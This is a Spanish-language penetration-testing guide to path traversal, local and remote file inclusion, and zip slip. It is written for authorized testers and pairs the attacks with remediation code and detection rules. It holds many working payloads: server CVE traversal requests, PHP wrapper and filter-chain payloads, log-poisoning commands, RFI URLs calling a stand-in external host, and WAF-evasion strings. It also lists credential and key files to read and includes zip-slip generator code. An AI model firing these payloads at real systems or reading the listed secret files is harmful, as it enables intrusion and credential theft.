# Recorrido de directorios e inclusión de ficheros (Path Traversal, LFI/RFI)

| Clasificación | |
|---|---|
| CWE | CWE-22 — Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal'); CWE-23 / CWE-36 (relativo / absoluto); CWE-73 — External Control of File Name or Path; CWE-98 — Improper Control of Filename for Include/Require Statement in PHP ('PHP Remote File Inclusion'); CWE-59 — Link Following |
| OWASP Top 10:2025 | A01 — Broken Access Control (recorrido de directorios); A05 — Injection (inclusión de ficheros con ejecución de código) |
| OWASP API Top 10:2023 | — (si el fichero pertenece a otro usuario, ver API1 BOLA) |
| WSTG | WSTG-ATHZ-01 (Testing Directory Traversal File Include); WSTG-INPV-11 (Testing for Code Injection: LFI/RFI) |

**Contenido:** 1. Qué es · 2. Dónde buscar · 3. Detección segura · 4. Explotación por contexto (lectura de ficheros Linux/Windows, traversal en la ruta de la URL y servidores, LFI en PHP y *wrappers*, filter chains, LFI→RCE por envenenamiento de logs y otros, RFI, otros lenguajes, zip slip y enlaces simbólicos) · 5. Evasión · 6. Escalada y encadenamiento · 7. Caja blanca · 8. Falsos positivos · 9. Evidencia · 10. Severidad · 11. Remediación · 12. Herramientas · 13. Referencias

---

## 1. Qué es y por qué ocurre

- **Recorrido de directorios** (*path traversal* o *directory traversal*): la aplicación construye una ruta de fichero con datos del usuario y no impide que esa ruta salga del directorio previsto, normalmente con secuencias `../` (subir un nivel) o con rutas absolutas (`/etc/passwd`). El efecto típico es **leer** ficheros arbitrarios; si la operación es de escritura (subidas, extracción de archivos comprimidos, logs), permite **escribir** o sobrescribir ficheros.
- **Inclusión local de ficheros** (LFI, *Local File Inclusion*): el fichero no solo se lee, sino que el intérprete lo **incluye y ejecuta** como código (típico de `include`/`require` en PHP). Si el atacante consigue colocar código en algún fichero local (logs, sesiones, subidas), la LFI se convierte en **ejecución remota de código** (RCE).
- **Inclusión remota de ficheros** (RFI, *Remote File Inclusion*): la función de inclusión acepta URLs y ejecuta código descargado de un servidor del atacante.
- **Zip slip**: al extraer un archivo comprimido, los nombres de entrada con `../` o rutas absolutas escriben fuera del directorio de destino.

Causas: concatenar rutas (`BASE + nombre`), confiar en filtros que eliminan `../` una sola vez, validar antes de decodificar, funciones de unión de rutas que descartan la base cuando el segundo argumento es absoluto (`os.path.join`, `Path.Combine`), diferencias de normalización entre proxy y aplicación, y `include` con nombre de plantilla controlable.

## 2. Dónde buscar (señales del reconocimiento)

```
file filename path filepath dir folder doc document page template view layout include inc
lang language locale skin theme style module download attachment img image src resource
report export log conf name item load read show cat pdf
```

- Descargas (`/download?file=factura_123.pdf`), visores de documentos, exportaciones, previsualización de adjuntos.
- Selectores de idioma/plantilla/tema (`?lang=es`, `?page=contact`, `?view=dashboard`), muy típicos de LFI en PHP.
- Rutas de URL que mapean a disco: `/static/<ruta>`, `/assets/`, `/files/<nombre>`, servidores de ficheros de frameworks.
- Valores que terminan en extensión (`.php`, `.html`, `.tpl`) o que parecen nombres de fichero sin extensión (el servidor añade el sufijo).
- Importación de ZIP/TAR/JAR/WAR, temas o plugins, copias de seguridad, despliegues por subida.
- Errores reveladores: `failed to open stream`, `No such file or directory`, `include(): Failed opening`, `java.io.FileNotFoundException`, `ENOENT`, `System.IO.DirectoryNotFoundException`, rutas absolutas en trazas.

## 3. Detección segura (primeras sondas, no destructivas)

1. **Línea base** con un fichero legítimo (`file=informe.pdf`).
2. **Equivalencias que no cambian el fichero**: si `file=./informe.pdf`, `file=sub/../informe.pdf` o `file=informe.pdf/.` devuelven lo mismo, el parámetro se trata como ruta y se normaliza → sospecha fuerte sin salir del directorio.
3. **Ficheros inocuos y universales** (evita `/etc/shadow` y ficheros con secretos como primera prueba):

   ```
   ../../../../../../etc/hostname
   ../../../../../../etc/passwd
   /etc/passwd
   ..\..\..\..\..\..\windows\win.ini
   C:\Windows\win.ini
   ../../../../../../proc/self/cmdline
   ```

4. **Profundidad**: usa 8–10 niveles de `../`; el exceso se ignora al llegar a la raíz.
5. **Sufijo o prefijo forzado**: si el servidor añade `.php` o exige empezar por `/var/www/images/`, prueba los patrones de §5 (`/var/www/images/../../../etc/passwd`).
6. **LFI frente a lectura**: si al pedir un `.php` local la respuesta lo ejecuta (no ves el código fuente), es inclusión. Prueba `php://filter/convert.base64-encode/resource=index` para ver el fuente sin ejecutarlo.

## 4. Explotación por contexto o tecnología

### 4.1 Ficheros de interés (lectura)

**Linux**

```
/etc/passwd  /etc/hostname  /etc/hosts  /etc/os-release  /etc/issue
/proc/self/environ          # variables de entorno: secretos, credenciales cloud (Lambda, contenedores)
/proc/self/cmdline          # comando del proceso (revela rutas y ficheros de configuración)
/proc/self/cwd/<fichero>    # directorio de trabajo del proceso sin conocer la ruta absoluta
/proc/self/fd/<n>           # descriptores abiertos (logs, sockets, ficheros borrados)
/proc/self/maps  /proc/version  /proc/net/tcp  /proc/sched_debug
/home/<usuario>/.ssh/id_rsa  /root/.ssh/authorized_keys  ~/.bash_history  ~/.aws/credentials  ~/.docker/config.json  ~/.kube/config
/var/run/secrets/kubernetes.io/serviceaccount/token
/etc/nginx/nginx.conf  /etc/nginx/sites-enabled/default  /etc/apache2/apache2.conf  /etc/apache2/sites-enabled/000-default.conf
/usr/local/etc/php/php.ini  /etc/php/*/apache2/php.ini
```

**Aplicación** (rutas relativas a la raíz del proyecto o vía `/proc/self/cwd/`):

```
.env  .git/config  .git/HEAD  config.php  wp-config.php  configuration.php  app/etc/env.php (Magento)
config/database.yml  config/master.key  config/credentials.yml.enc (Rails)
settings.py  local_settings.py  instance/config.py (Flask)
application.properties  application.yml  WEB-INF/web.xml  WEB-INF/classes/application.properties  META-INF/MANIFEST.MF
appsettings.json  appsettings.Production.json  web.config
package.json  .npmrc  composer.json  docker-compose.yml  Dockerfile
```

**Windows**

```
C:\Windows\win.ini   C:\Windows\System32\drivers\etc\hosts   C:\boot.ini (antiguo)
C:\inetpub\wwwroot\web.config   C:\inetpub\logs\LogFiles\W3SVC1\
C:\Windows\Panther\Unattend.xml   C:\Windows\Panther\Unattended.xml   C:\Windows\System32\sysprep\sysprep.xml
C:\ProgramData\<app>\   C:\Users\<usuario>\.aws\credentials
```

### 4.2 Traversal en la ruta de la URL y en servidores

```
GET /static/..%2f..%2f..%2fetc%2fpasswd
GET /static/%2e%2e/%2e%2e/%2e%2e/etc/passwd
GET /files/..%252f..%252f..%252fetc/passwd                 # doble decodificación
GET /app/..;/manager/html                                  # Tomcat: ';' inicia parámetro de ruta; proxy y Tomcat normalizan distinto
GET /assets../etc/passwd                                   # nginx "off-by-slash": location /assets { alias /var/www/assets/; }
GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd                # Apache 2.4.49 (CVE-2021-41773)
GET /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/etc/passwd      # Apache 2.4.50 (CVE-2021-42013)
GET /..%5c..%5c..%5cwindows/win.ini                        # IIS/servidores Windows: '\' codificada
```

Spring: `/static/..%2f` suele bloquearse por `StrictHttpFirewall`; prueba `;` (`/static;/..;/`) y mayúsculas en la codificación (`%2F`). Node con `express.static` es seguro; servidores de ficheros caseros (`fs.readFile(path.join(root, req.path))`) no.

### 4.3 LFI en PHP y *wrappers*

Un *wrapper* es un prefijo de esquema (`php://`, `data://`, `zip://`…) que PHP entiende en las funciones de ficheros.

```
?page=../../../../etc/passwd
?page=php://filter/convert.base64-encode/resource=index.php           # leer fuente sin ejecutar
?page=php://filter/read=string.rot13/resource=config.php
?page=php://filter/convert.iconv.utf-8.utf-16/resource=config.php      # alternativa si base64 está filtrado
?page=php://filter/zlib.deflate/convert.base64-encode/resource=config.php   # ficheros grandes
?page=pHp://FilTer/convert.base64-encode/resource=index                  # evasión por mayúsculas
?page=file:///etc/passwd
?page=data://text/plain;base64,PD9waHAgZWNobyAnQ09SVlVTLScuKDcqNyk7ID8+   # requiere allow_url_include=On (imprime CORVUS-49)
?page=php://input   (POST con <?php echo 'CORVUS-'.(7*7); ?>)            # requiere allow_url_include=On
?page=expect://id                                                       # requiere extensión expect (rara)
?page=zip://uploads/avatar.zip%23marker.php                             # ejecutar un PHP dentro de un ZIP subido
?page=phar://uploads/avatar.jpg/marker.php                              # PHAR disfrazado de imagen
```

`phar://` también dispara **deserialización** de metadatos en PHP < 8.0 con cualquier función de fichero (`file_exists`, `filesize`…); desde PHP 8.0 los metadatos solo se deserializan al llamar a `getMetadata()` (ver `vulns/deserialization.md`).

### 4.4 *Filter chains*: RCE y lectura a ciegas sin fichero controlado

- **RCE con `php://filter` encadenado** (Synacktiv, 2022): una cadena de conversiones `convert.iconv.*` genera bytes arbitrarios a partir de cualquier fichero existente, de modo que `include` acaba ejecutando PHP elegido por el atacante. No necesita `allow_url_include` ni subir ficheros. Genera la cadena con `php_filter_chain_generator.py` usando un marcador inocuo:

  ```bash
  python3 php_filter_chain_generator.py --chain '<?php echo "CORVUS-".(7*7); ?>'
  # ?page=<cadena generada>  → la respuesta contiene CORVUS-49
  ```

- **Lectura a ciegas por oráculo de errores** (Synacktiv, 2023, herramienta `php_filter_chains_oracle_exploit`): cuando la ruta llega a funciones que no muestran el contenido (`file_get_contents` sin eco, `md5_file`, `getimagesize`, `file_exists`…), las cadenas provocan o no un error de memoria según cada carácter, y el fichero se reconstruye byte a byte.
- **wrapwrap** (Ambionics, 2024): añade prefijos y sufijos arbitrarios al contenido leído para que pase validaciones de formato (p. ej. JSON o XML esperado).
- **CNEXT / CVE-2024-2961** (desbordamiento en `iconv` de glibc, conjunto ISO-2022-CN-EXT): convierte una primitiva de lectura con `php://filter` en RCE en sistemas con glibc sin parchear. ⚠️ Explota corrupción de memoria: requiere confirmación explícita del cliente.

### 4.5 LFI → RCE (colocar código en un fichero local e incluirlo)

Usa siempre un **marcador inocuo** (`<?php echo 'CORVUS-'.(7*7); ?>`), nunca una *webshell* permanente.

⚠️ Todas estas técnicas **escriben** en logs, sesiones o ficheros temporales del servidor: requieren confirmación explícita del cliente y anotar qué se ha contaminado.

```bash
# Envenenamiento de log de acceso (Apache/nginx): el User-Agent se escribe en el log
curl -s 'https://target/' -A "<?php echo 'CORVUS-'.(7*7); ?>"
# ?page=../../../../var/log/apache2/access.log   (también /var/log/nginx/access.log, /var/log/httpd/access_log)
# Un error de sintaxis PHP en el log puede romper la inclusión para siempre: prueba antes con un marcador mínimo.
```

```
# Otros ficheros donde inyectar texto controlado
/var/log/auth.log            # usuario SSH inventado: ssh '<?php echo 1;?>'@target  (si es legible por el servidor web)
/var/log/mail.log            # destinatario o asunto de un correo enviado por la app
/var/lib/php/sessions/sess_<PHPSESSID>   /tmp/sess_<PHPSESSID>   # valor de sesión controlado (p. ej. nombre de usuario)
/proc/self/fd/<n>            # descriptor del log abierto por el proceso
/proc/self/environ           # CGI antiguo: HTTP_USER_AGENT en el entorno
```

- **`PHP_SESSION_UPLOAD_PROGRESS`**: con `session.upload_progress.enabled` (activo por defecto), un `POST multipart` que incluya el campo `PHP_SESSION_UPLOAD_PROGRESS` escribe su valor en el fichero de sesión aunque la app no use sesiones; se combina con una carrera para incluirlo antes de que se limpie.
- **`pearcmd.php`** (imágenes Docker oficiales de PHP con PEAR y `register_argc_argv=On`): la query se interpreta como argumentos de línea de comandos y `config-create` escribe un fichero con contenido controlado:

  ```
  ?page=/usr/local/lib/php/pearcmd.php&+config-create+/<?=print('CORVUS-'.(7*7))?>+/tmp/corvus_poc.php
  ?page=/tmp/corvus_poc.php
  ```

- **Ficheros temporales de subida**: `phpinfo()` revela el nombre temporal (`/tmp/phpXXXXXX`) de un fichero subido; con una carrera se incluye antes de su borrado. En nginx, los cuerpos grandes se guardan en ficheros temporales accesibles vía `/proc/<pid>/fd/<n>`.
- **Subida + LFI**: subir una imagen con el marcador en metadatos o tras los datos de imagen e incluirla (ver `vulns/file-upload.md`).

### 4.6 Inclusión remota (RFI)

```
?page=http://<id>.oast.example/corvus.txt          # requiere allow_url_fopen y allow_url_include
?page=http://<id>.oast.example/corvus.txt%00        # PHP antiguo con sufijo forzado
?page=http://<id>.oast.example/corvus.txt?          # el sufijo ".php" queda como query
?page=\\<IP-auditor>\share\corvus.php               # Windows: UNC se trata como ruta local y elude allow_url_include
```

Sirve un fichero que solo imprima un marcador. Una interacción OAST ya demuestra que el servidor intenta incluir recursos remotos. ⚠️ La variante UNC/SMB filtra el hash NTLM de la cuenta de servicio: requiere confirmación explícita del cliente.

### 4.7 Otros lenguajes y frameworks

- **Java**: `new File(base, userInput)` y `Paths.get(base, input)` no impiden `../`; leer `WEB-INF/web.xml` y `WEB-INF/classes/` revela configuración y clases. `<jsp:include page="${param.p}"/>` y `request.getRequestDispatcher(p)` permiten incluir recursos internos. En Spring MVC, devolver un nombre de vista controlado (`return "views/" + name;`) puede derivar en inyección de expresiones en Thymeleaf (ver `vulns/ssti.md`).
- **Python**: `os.path.join("/srv/files", "/etc/passwd")` devuelve `/etc/passwd`; `open(BASE + name)`; Flask `send_file(name)` frente a `send_from_directory(dir, name)` (este último sí protege); Jinja `render_template(user_value)`.
- **Node**: `fs.readFile(path.join(__dirname, 'uploads', req.query.f))`; `res.sendFile(req.query.f)` sin opción `root`; `res.render(req.query.view)` con algunos motores.
- **.NET**: `Path.Combine(baseDir, input)` descarta la base si `input` es absoluto (`C:\...` o `\\servidor\...`); `File(path, mime)` en MVC; `Server.MapPath(input)`.
- **Ruby/Rails**: `send_file params[:f]`, `File.read(Rails.root.join('public', params[:f]))`, `render file: params[:t]` (CVE-2016-0752 en Rails antiguos permitía `render params[:template]`).
- **Go**: `filepath.Join(base, input)` limpia la ruta pero conserva el recorrido hacia arriba (`../../etc/passwd` sigue saliendo de la base); `http.ServeFile(w, r, r.URL.Query().Get("f"))`.

### 4.8 Zip slip, enlaces simbólicos y escritura de ficheros

```python
# Generar un ZIP de prueba cuya entrada escribe un marcador inocuo fuera del destino
import zipfile
with zipfile.ZipFile("zipslip_poc.zip", "w") as z:
    z.writestr("normal.txt", "ok")
    z.writestr("../../../../var/www/html/corvus_zipslip_poc.txt", "CORVUS-ZIPSLIP-POC")
# Variante con ruta absoluta: "/tmp/corvus_zipslip_poc.txt"; en Windows: "..\\..\\corvus_zipslip_poc.txt"
```

```bash
# TAR con enlace simbólico: si el extractor sigue enlaces, la entrada posterior escribe/lee fuera
ln -s /etc/hostname link_poc && tar -cvf symlink_poc.tar link_poc
```

⚠️ Zip slip y nombres de fichero con `../` en subidas **escriben ficheros** en el servidor: requiere confirmación explícita del cliente. Elige una ruta inocua (directorio web público o `/tmp`), un nombre único y un contenido marcador; verifica con una lectura y solicita su borrado.

## 5. Evasión de filtros y WAF

```
....//....//....//etc/passwd            # el filtro elimina "../" una vez y deja "../"
..././..././..././etc/passwd
....\/....\/etc/passwd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd  # codificación URL
%2e%2e/  ..%2f  %2e%2e%5c  ..%5c        # codificación parcial y barra invertida
%252e%252e%252f                          # doble codificación (decodifican proxy y app)
%c0%ae%c0%ae/  %c0%af  %e0%80%af         # UTF-8 sobrelargo (servidores antiguos)
..%u2215  ..%u2216                       # IIS antiguo, Unicode %u
..\/..\/  ..//..//  .../.../             # mezcla de separadores
/var/www/images/../../../etc/passwd      # prefijo obligatorio
../../../etc/passwd%00.png               # byte nulo (PHP < 5.3.4, Java antiguo)
../../../etc/passwd/././././[...]        # truncado por longitud (PHP < 5.3, ~4096 bytes)
/etc/passwd%20  /etc/passwd.  /etc/passwd::$DATA   # Windows ignora punto/espacio final y ADS
file:///etc/passwd   \\?\C:\Windows\win.ini   \\localhost\c$\windows\win.ini
```

- Si se exige una extensión concreta y no hay byte nulo, busca ficheros útiles con esa extensión o usa `/proc/self/cwd/` y *wrappers* que ignoren el sufijo (`php://filter/.../resource=config` cuando el código añade `.php`).
- Para WAF que inspeccionan `/etc/passwd`, usa ficheros alternativos (`/etc/hostname`, `/proc/self/cmdline`) o separadores redundantes (`/etc//passwd`, `/./etc/./passwd`).
- Más técnicas genéricas en `vulns/waf-bypass.md`.

## 6. Escalada y encadenamiento (demostrar impacto máximo sin causar daño)

| Cadena | Demostración segura |
|---|---|
| Lectura → secretos de configuración (`.env`, `appsettings.json`) | Mostrar nombres de las claves y valores enmascarados; no usarlos sin autorización |
| Lectura → `/proc/self/environ` → credenciales cloud | Igual que en SSRF: `sts get-caller-identity` solo si se autoriza |
| Lectura de código fuente → caja blanca | Buscar más fallos (SQLi, deserialización, claves de firma JWT/cookies) |
| Lectura de clave de firma (Flask `SECRET_KEY`, Rails `secret_key_base`, ASP.NET `machineKey`) | Explicar la falsificación de sesiones/ViewState posible; ⚠️ firmar objetos maliciosos requiere confirmación explícita del cliente (ver `vulns/deserialization.md`, `vulns/session.md`) |
| LFI → RCE (logs, sesiones, filter chain, pearcmd) | Marcador `CORVUS-49`; ⚠️ cualquier escritura requiere confirmación explícita del cliente |
| Zip slip → escritura en web root → RCE | Fichero `.txt` marcador; ⚠️ un `.php`/`.jsp` ejecutable solo con confirmación explícita y borrado inmediato |
| Traversal en subida → sobrescritura (`.htaccess`, `authorized_keys`, cron) | ⚠️ No sobrescribir ficheros existentes; demostrar con un fichero nuevo |
| Path traversal en API interna desde SSRF o en `X-Original-URL` | Ver `vulns/ssrf.md`, `vulns/access-control-idor.md` |

## 7. Caja blanca: fuentes, sumideros y patrones de código

**Sumideros**: apertura y servicio de ficheros (`open`, `readFile`, `File`, `send_file`, `sendFile`, `ServeFile`), inclusión (`include`, `require`, `render`), extracción de archivos (`ZipFile.extractall`, `tarfile.extractall`, `ZipInputStream`, `adm-zip`, `unzipper`), escritura (`move_uploaded_file`, `transferTo`, `SaveAs`).

**PHP**

```php
// VULNERABLE
include($_GET['page'] . '.php');
readfile('/var/www/files/' . $_GET['file']);

// SEGURO: lista blanca de valores lógicos
$pages = ['home' => 'home.php', 'contact' => 'contact.php'];
include __DIR__ . '/pages/' . ($pages[$_GET['page'] ?? 'home'] ?? 'home.php');
// SEGURO: canonicalizar y comprobar prefijo
$base = realpath('/var/www/files') . DIRECTORY_SEPARATOR;
$real = realpath($base . $_GET['file']);
if ($real === false || strncmp($real, $base, strlen($base)) !== 0) { http_response_code(404); exit; }
readfile($real);
```

**Java / Spring**

```java
// VULNERABLE
File f = new File("/srv/files/" + request.getParameter("name"));

// SEGURO
Path base = Paths.get("/srv/files").toRealPath();
Path target = base.resolve(name).normalize();
if (!target.startsWith(base)) throw new AccessDeniedException(name);
// Zip slip: aplicar la misma comprobación a cada ZipEntry.getName() antes de escribir
```

**Python / Django / Flask**

```python
# VULNERABLE
return send_file(os.path.join(UPLOADS, request.args["f"]))
tarfile.open(p).extractall(dest)            # sin filtro: rutas absolutas, ../ y enlaces

# SEGURO
from flask import send_from_directory
return send_from_directory(UPLOADS, request.args["f"])   # usa safe_join internamente
real = os.path.realpath(os.path.join(BASE, name))
if os.path.commonpath([real, BASE]) != BASE: abort(404)
tarfile.open(p).extractall(dest, filter="data")          # Python 3.12+ (filtros de extracción, PEP 706)
```

**Node / Express**

```js
// VULNERABLE
res.sendFile(path.join(__dirname, 'files', req.query.f));

// SEGURO
res.sendFile(req.query.f, { root: path.join(__dirname, 'files'), dotfiles: 'deny' }); // rechaza salir de root
// o manualmente:
const base = path.resolve(__dirname, 'files') + path.sep;
const target = path.resolve(base, req.query.f);
if (!target.startsWith(base)) return res.sendStatus(404);
```

**.NET**

```csharp
// VULNERABLE
return PhysicalFile(Path.Combine(_root, name), "application/octet-stream");

// SEGURO
var baseDir = Path.GetFullPath(_root) + Path.DirectorySeparatorChar;
var full = Path.GetFullPath(Path.Combine(baseDir, name));
if (!full.StartsWith(baseDir, StringComparison.Ordinal)) return NotFound();
```

**Go**

```go
// VULNERABLE
http.ServeFile(w, r, filepath.Join("/srv/files", r.URL.Query().Get("f")))

// SEGURO (Go 1.24+): os.Root confina todas las operaciones al directorio, incluidos enlaces simbólicos
root, _ := os.OpenRoot("/srv/files")
f, err := root.Open(r.URL.Query().Get("f"))
// En versiones anteriores: filepath.IsLocal(name) (Go 1.20+) antes de unir rutas
```

**Ruby / Rails**

```ruby
# VULNERABLE
send_file Rails.root.join("files", params[:f])

# SEGURO
base = Rails.root.join("files").realpath.to_s + "/"
path = File.realpath(File.join(base, params[:f])) rescue (head :not_found and return)
return head :not_found unless path.start_with?(base)
send_file path
```

**Búsqueda con ripgrep**

```bash
rg -n --pcre2 '\b(include|require)(_once)?\s*\(?\s*\$_(GET|POST|REQUEST|COOKIE)|readfile\(|file_get_contents\(|fopen\(' -g '*.php'
rg -n --pcre2 'send_file\(|open\(.*request\.|os\.path\.join\(.*request|extractall\(|render_template\(\s*request' -g '*.py'
rg -n --pcre2 'sendFile\(|createReadStream\(|readFile(Sync)?\(.*req\.|path\.join\(.*req\.(query|params|body)|adm-zip|unzipper|extract\(' -g '*.{js,ts}'
rg -n --pcre2 'new File\(.*(getParameter|request)|Paths\.get\(.*(getParameter|request)|ZipEntry|getRequestDispatcher\(' -g '*.{java,kt,jsp}'
rg -n --pcre2 'Path\.Combine\(|PhysicalFile\(|File\.(ReadAll|Open)|Server\.MapPath\(|ZipFile\.ExtractToDirectory' -g '*.cs'
rg -n --pcre2 'filepath\.Join\(|http\.ServeFile\(|os\.Open\(|zip\.OpenReader' -g '*.go'
rg -n --pcre2 'send_file|File\.(read|open)\(.*params|render\s+(file:|params)' -g '*.rb'
```

**Semgrep**

```bash
semgrep --config p/security-audit --config p/owasp-top-ten .
```

```yaml
rules:
  - id: corvus-path-traversal-express-sendfile
    mode: taint
    languages: [javascript, typescript]
    severity: ERROR
    message: Ruta construida con datos del usuario llega a una operación de ficheros
    pattern-sources:
      - pattern: $REQ.query
      - pattern: $REQ.params
      - pattern: $REQ.body
    pattern-sinks:
      - pattern: $RES.sendFile(...)
      - pattern: fs.readFile(...)
      - pattern: fs.readFileSync(...)
      - pattern: fs.createReadStream(...)
    pattern-sanitizers:
      - pattern: path.basename(...)
```

## 8. Falsos positivos frecuentes

- La respuesta contiene `root:x:0:0` porque la aplicación **devuelve la entrada reflejada** (o un ejemplo de documentación), no el fichero: comprueba con un fichero de contenido impredecible (`/etc/hostname`, `/proc/self/cmdline`).
- **Ficheros públicos** que ya eran accesibles por diseño (lectura dentro del directorio permitido).
- **Código 200 con página genérica** (SPA que devuelve `index.html` para cualquier ruta): compara tamaño y contenido.
- La traversal solo funciona en tu **navegador/proxy** porque normaliza la URL antes de enviarla: usa Burp Repeater con la ruta en bruto.
- `php://filter` devuelve base64 de un fichero **vacío o inexistente**: decodifica y verifica.
- Zip slip "aceptado" pero la librería **ignora o sanea** la entrada: confirma que el fichero existe fuera del destino.

## 9. Evidencia mínima para validarlo

- Petición exacta (con codificación literal) y respuesta con un fragmento del fichero leído; preferir `/etc/hostname`, `win.ini` o código fuente no sensible.
- Si se leyeron secretos: nombres de las claves con valores enmascarados.
- Para LFI→RCE: payload, fichero usado como vector, respuesta con `CORVUS-49` y lista de ficheros contaminados/creados para su limpieza.
- Para zip slip: archivo usado (hash), ruta escrita y prueba de su existencia (lectura del marcador).

## 10. Severidad orientativa (vectores CVSS 3.1 y 4.0 típicos según impacto demostrado)

| Escenario demostrado | CVSS 3.1 | CVSS 4.0 (vector) |
|---|---|---|
| Lectura arbitraria con sesión de usuario | `AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N` (6.5) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Lectura arbitraria sin autenticación | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` (7.5) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:N/SI:N/SA:N` |
| Lectura de credenciales que dan acceso a otros sistemas | `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N` (8.6) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N` |
| Escritura arbitraria / zip slip con sesión | `AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:H/A:H` (8.1) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N` |
| LFI/RFI → RCE sin autenticación | `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8) | `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |
| LFI → RCE que exige carrera (temporales, upload progress) | `AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H` (8.1) | `CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N` |

Calcula la puntuación 4.0 exacta en la calculadora oficial de FIRST.

## 11. Remediación (con ejemplo de código correcto)

1. **Indirección**: el cliente envía un identificador (`doc_id=42`) y el servidor busca la ruta en una tabla o mapa; nunca recibe nombres de fichero.
2. Si el nombre es inevitable: **lista blanca** de caracteres (`^[A-Za-z0-9_-]{1,64}\.(pdf|png)$`), sin separadores, y luego **canonicalizar** (`realpath`, `toRealPath`, `GetFullPath`) y comprobar que el resultado empieza por el directorio base **con separador final**.
3. Usar APIs de confinamiento cuando existan: Go `os.Root`, Flask `send_from_directory`, Express `sendFile` con `root`, Python `tarfile` con `filter="data"`.
4. PHP: `allow_url_include=Off`, `open_basedir` como defensa en profundidad, no incluir nunca rutas derivadas del usuario.
5. Archivos comprimidos: validar cada entrada (sin rutas absolutas, sin `..`, sin enlaces simbólicos/duros), límites de tamaño y número de entradas.
6. Ejecutar el proceso con un usuario sin acceso a ficheros sensibles; montar el código como solo lectura; logs fuera del alcance del usuario web.

```java
// Descarga segura por identificador + confinamiento
@GetMapping("/download/{id}")
ResponseEntity<Resource> download(@PathVariable long id, Principal user) throws IOException {
    Document doc = repo.findByIdAndOwner(id, user.getName()).orElseThrow(NotFoundException::new);
    Path base = Paths.get("/srv/files").toRealPath();
    Path file = base.resolve(doc.getStoredName()).normalize();   // storedName generado por el servidor (UUID)
    if (!file.startsWith(base)) throw new NotFoundException();
    return ResponseEntity.ok().header(HttpHeaders.CONTENT_DISPOSITION, "attachment").body(new FileSystemResource(file));
}
```

## 12. Herramientas (comando y cuándo usarla; automatización solo tras confirmación manual, nunca como primer barrido)

| Herramienta | Uso | Cuándo |
|---|---|---|
| Burp Repeater | Enviar rutas sin normalizar, probar codificaciones | Siempre primero |
| `ffuf` | `ffuf -u 'https://t/dl?file=FUZZ' -w lfi-linux.txt -mr 'root:x:0:0' -rate 10` | Tras confirmar el parámetro, para variantes de evasión |
| dotdotpwn | Fuzzer de traversal multiprotocolo (`-m http`) | Barrido de variantes tras validar a mano |
| `php_filter_chain_generator.py` (Synacktiv) | `--chain '<?php echo "CORVUS-".(7*7); ?>'` | LFI en PHP sin fichero controlable |
| `php_filter_chains_oracle_exploit` (Synacktiv) | Lectura a ciegas por oráculo de errores | Ruta que llega a funciones sin salida visible |
| wrapwrap (Ambionics) | Prefijos/sufijos sobre contenido leído con filtros | Cuando el resultado debe cumplir un formato |
| Script Python de §4.8 / evilarc | Archivos de zip slip | ⚠️ Escritura: solo con confirmación explícita del cliente |
| Nuclei | Plantillas de LFI/CVE de servidores (`-tags lfi`) | Verificación a escala tras validar el patrón |
| Listas SecLists `Fuzzing/LFI/` | Diccionarios de rutas y evasiones | Con ffuf/Intruder |

## 13. Referencias

- PortSwigger Web Security Academy — Path traversal: https://portswigger.net/web-security/file-path-traversal
- OWASP WSTG — WSTG-ATHZ-01 Testing Directory Traversal File Include; WSTG-INPV-11 (LFI/RFI)
- OWASP — Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
- PayloadsAllTheThings — Directory Traversal y File Inclusion: https://github.com/swisskyrepo/PayloadsAllTheThings
- HackTricks — File Inclusion / Path Traversal y "LFI2RCE" (book.hacktricks.wiki)
- Synacktiv — "PHP filters chain: what is it and how to use it" (2022) y "PHP filter chains: file read from error-based oracle" (2023)
- Ambionics (Charles Fol) — "Iconv, set the charset to RCE" (CNEXT, CVE-2024-2961) y wrapwrap
- Snyk — Zip Slip Vulnerability (2018)
- Python PEP 706 — Filter for `tarfile.extractall`
- CWE-22: https://cwe.mitre.org/data/definitions/22.html · CWE-98: https://cwe.mitre.org/data/definitions/98.html
